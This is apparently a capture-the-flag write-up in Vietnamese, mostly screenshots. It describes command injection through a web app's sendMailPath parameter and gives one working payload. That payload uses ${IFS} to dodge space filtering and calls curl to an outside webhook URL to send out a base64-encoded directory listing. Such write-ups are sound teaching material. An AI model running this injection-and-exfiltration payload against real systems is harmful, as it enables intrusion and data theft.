![image](https://github.com/user-attachments/assets/81dcd987-491a-4a58-bd8f-4ca6826b483e)

Đây là giao diện:

![image](https://github.com/user-attachments/assets/af05f7aa-b242-4a8a-911a-6dd22b232df4)

Đây là req của nó:

![image](https://github.com/user-attachments/assets/5654bda1-e644-4a21-bc9d-12ae19b09f35)

Đọc src code thì để ý đến cái đường dẫn, có vẻ nó sẽ phản ứng với command injection

![image](https://github.com/user-attachments/assets/303f10e6-e485-4d1f-954e-14857f7bcd70)

Tôi dùng payload `sendMailPath=/usr/sbin/sendmail;curl${IFS}https://webhook.site/f652081d-e649-447e-be99-a8f449d837de?a=$(ls${IFS}/${IFS}|${IFS}base64)` thì được vì `${IFS}` có giá trị tương đương với space 

![image](https://github.com/user-attachments/assets/88afc80e-31b4-40fe-aba3-17336d6ed00b)

![image](https://github.com/user-attachments/assets/865184ae-d8e2-4c9f-a6b1-00aba5d03fd7)

![image](https://github.com/user-attachments/assets/a8449956-0994-4740-b0cf-07954753627e)

Giờ thì cat flag.txt là xong


